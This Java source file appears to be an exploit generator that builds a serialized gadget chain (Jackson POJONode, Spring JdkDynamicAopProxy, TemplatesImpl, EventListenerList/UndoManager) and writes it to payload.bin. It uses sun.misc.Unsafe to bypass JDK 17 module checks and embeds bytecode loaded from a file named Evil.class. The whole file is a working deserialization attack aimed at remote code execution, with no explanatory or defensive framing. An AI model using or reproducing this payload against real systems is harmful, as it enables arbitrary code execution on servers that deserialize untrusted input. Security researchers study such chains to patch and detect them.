package org.example;

import java.io.*;
import java.lang.reflect.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Vector;

import javax.swing.event.EventListenerList;
import javax.swing.undo.UndoManager;
import javax.xml.transform.Templates;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;

import org.springframework.aop.framework.AdvisedSupport;

import com.fasterxml.jackson.databind.node.POJONode;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import sun.misc.Unsafe;

@SuppressWarnings({"rawtypes", "unchecked", "CallToPrintStackTrace"})
public class JDK17Spring {
    public static void main(String[] args) throws Exception {

        try {
            ClassPool pool = ClassPool.getDefault();
            CtClass ctClass = pool.get("com.fasterxml.jackson.databind.node.BaseJsonNode");
            CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
            ctClass.removeMethod(writeReplace);
            ctClass.toClass();
        } catch (Exception e) {
            return;
        }

        Class unsafeClass = Class.forName("sun.misc.Unsafe");
        Field field = unsafeClass.getDeclaredField("theUnsafe");
        field.setAccessible(true);
        Unsafe unsafe = (Unsafe) field.get(null);
        Module baseModule = Object.class.getModule();
        Class currentClass = JDK17Spring.class;
        long addr = unsafe.objectFieldOffset(Class.class.getDeclaredField("module"));
        unsafe.getAndSetObject(currentClass, addr, baseModule);

        byte[] code = Files.readAllBytes(Paths.get("Evil.class"));
        byte[] uselessCode = ClassPool.getDefault().makeClass("Burger").toBytecode();

        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", new byte[][] { code, uselessCode });
        setFieldValue(templates, "_name", "Burger King");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        setFieldValue(templates,"_transletIndex",0);

        AdvisedSupport support = new AdvisedSupport();
        support.setTarget(templates);

        Class<?> proxyClass = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy");
        Constructor<?> constructor = proxyClass.getConstructor(AdvisedSupport.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(support);

        Templates proxy = (Templates) Proxy.newProxyInstance(
                Templates.class.getClassLoader(),
                new Class[]{Templates.class},
                handler
        );

        POJONode jsonNode = new POJONode(proxy);

        EventListenerList list = new EventListenerList();
        UndoManager undomanager = new UndoManager();
        Field f = undomanager.getClass().getSuperclass().getDeclaredField("edits");
        f.setAccessible(true);
        Vector vector = (Vector) f.get(undomanager);
        vector.add(jsonNode);
        setFieldValue(list, "listenerList", new Object[]{Class.class, undomanager});

        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("payload.bin"));
        oos.writeObject(list);
        oos.close();
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

}
